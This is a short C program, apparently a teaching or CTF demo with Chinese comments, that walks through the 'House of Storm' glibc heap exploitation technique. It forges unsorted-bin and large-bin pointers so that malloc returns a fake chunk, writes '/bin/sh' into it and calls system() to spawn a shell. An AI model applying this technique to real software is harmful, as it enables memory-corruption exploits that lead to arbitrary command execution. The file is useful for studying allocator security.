// gcc -ggdb -fpie -pie -o house_of_storm house_of_storm.c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
struct {
    unsigned long  presize;
    unsigned long  size;
    unsigned long  fd;
    unsigned long  bk;
    unsigned long  fd_nextsize;
    unsigned long  bk_nextsize;
}chunk;

int main()
{
    unsigned long *large_chunk,*unsorted_chunk;
    unsigned long *fake_chunk = (unsigned long *)&chunk;
    char *ptr;


    unsorted_chunk = malloc ( 0x4e8 );
    malloc(0X20);
    large_chunk  =  malloc ( 0x4d8 );
    malloc(0x20);


    free(large_chunk);
    free(unsorted_chunk);
    unsorted_chunk=malloc(0x418);  //large_chunk归位
    free(unsorted_chunk);  // unsorted_chunk归位

	//重点一下3步
    unsorted_chunk[1] = (unsigned long )fake_chunk;
    large_chunk[1]    = (unsigned long )fake_chunk+8;
    large_chunk[3]    = (unsigned long )fake_chunk-0x18-5;

    
    ptr=malloc(0x48);
    strncpy(ptr, "/bin/sh\x00", 0x10);
    system(((char *)fake_chunk + 0x10));
    
    return 0;
}
